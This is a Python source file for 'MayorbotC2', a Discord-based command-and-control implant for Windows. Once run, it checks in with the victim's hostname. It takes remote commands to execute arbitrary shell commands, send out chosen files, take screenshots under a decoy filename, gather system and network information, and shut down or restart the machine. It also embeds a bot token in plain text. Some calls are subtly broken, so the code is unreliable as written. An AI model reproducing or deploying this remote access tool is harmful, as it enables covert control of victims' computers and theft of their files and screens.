#MayorbotC2

from ast import alias
from asyncio import subprocess
import asyncio
from click import command
import discord
import os
import subprocess
from subprocess import PIPE, run
import sys
import time
import pyautogui
import socket
from discord.ext import commands

intents = discord.Intents(
    messages = True,
    message_content = True, 
    members = True, 
    presences = True,
    guilds = True
)

client = commands.Bot(command_prefix=".", intents=intents)


@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))
    channel = client.get_channel(960346519427481662)
    embedVar = discord.Embed(description="Checking in to work.")    
    await channel.send(embed=embedVar)
    host_name = discord.Embed(description=socket.gethostname() + " checking in.")
    await channel.send(embed=host_name)

@client.command(aliases=['run'])
async def custom_command(message, command):
    """runs a command"""
    print("registered")
    args = command
    if len(args) == 1:
        embed=discord.Embed(title="Error", description="Please enter a command to run.", color=0xFF0000)
        await message.channel.send(embed=embed)
    else:
        command = args[1:]
        command = ' '.join(command)
        print(command)
        output = os.system(command, shell=True)
        await message.channel.send(f'```{output.strip().decode("utf-8")}```')

@client.command(aliases=['ipconfig'])
async def ip(message):
    ip = os.system('ipconfig')
    if len(ip) >= 2000:
        with open("C:\\Users\\Public\\ip.txt", "wt") as f:
            f.write(str(ip.strip().decode('utf-8')))
        f.close()
        await message.channel.send(file=discord.File('C:\\Users\\Public\\ip.txt'))
        os.remove("C:\\Users\\Public\\ip.txt")

@client.command(aliases=['terminate', 'end', 'kill'])
async def exit(message):
    sys.exit()

@client.command(aliases=['reset'])
async def restart(message):
    command = 'shutdown -r -t 0'
    output = os.system(command)
    if output == 0:
        await message.channel.send(f"shut down with exit code ``{output}``")
    else:
        await message.channel.send("failed.")


@client.command(aliases=['shut'])
async def shutdown(message):
    command = 'shutdown -s -t 0'
    output = os.system(command)
    if output == 0:
        await message.channel.send("shut down.")
    else:
        await message.channel.send("failed.")

@client.command(aliases=['grab', 'file'])
async def filegrab(message):
    args = message.content.split()
    if len(args) == 1:
        await message.channel.send("Please enter a file.")
    else:
        file = args[1:]
        file = ' '.join(file)
        print(file)
        with open(file, 'rb') as f:
            await message.channel.send(file=discord.File(f))

@client.command(aliases=['sysinfo', 'system', 'systeminfo', 'info'])
async def sys(message):
    sys_info = os.system('systeminfo')
    if len(sys_info) >= 2000:
        with open("C:\\Users\\Public\\sysinfo.txt", "wt") as f:
            f.write(str(sys_info.strip().decode('utf-8')))
        f.close()
        await message.channel.send(file=discord.File('C:\\Users\\Public\\sysinfo.txt'))  
        os.remove("C:\\Users\\Public\\sysinfo.txt")        
    else:
        await message.channel.send(sys_info)

@client.command(aliases=['screenie', 'screen', 'screenshot', 'sshot'])
async def ss(message):
    sct_shot = pyautogui.screenshot()
    sct_shot.save('C:\\Users\\Public\\puppies.png')
    with open(r'C:\\Users\\Public\\puppies.png', 'rb') as f:
        await message.channel.send(file=discord.File(f))
    os.remove(r'C:\\Users\\Public\\puppies.png')

@client.command(aliases=['directory', 'setdir', 'dir'])
async def cd(message):
    args = message.content.split()
    if len(args) == 1:
        embed=discord.Embed(title="Error", description="Please enter a directory.", color=0xFF0000)
        await message.channel.send(embed=embed)
    else:
        directory = args[1:]
        directory = ' '.join(directory)
        print(directory)
        os.chdir(directory)
        embed=discord.Embed(title="Directory changed to:", description=directory,  color=0x00FF00)
        await message.channel.send(embed=embed)

async def run():
    await client.start('OTY5NDg0MzAwNjUzMzA1ODc5.YmuEnQ.WNu6zI7GnzCnV8IeRATw0HZJANg')

asyncio.run(run())
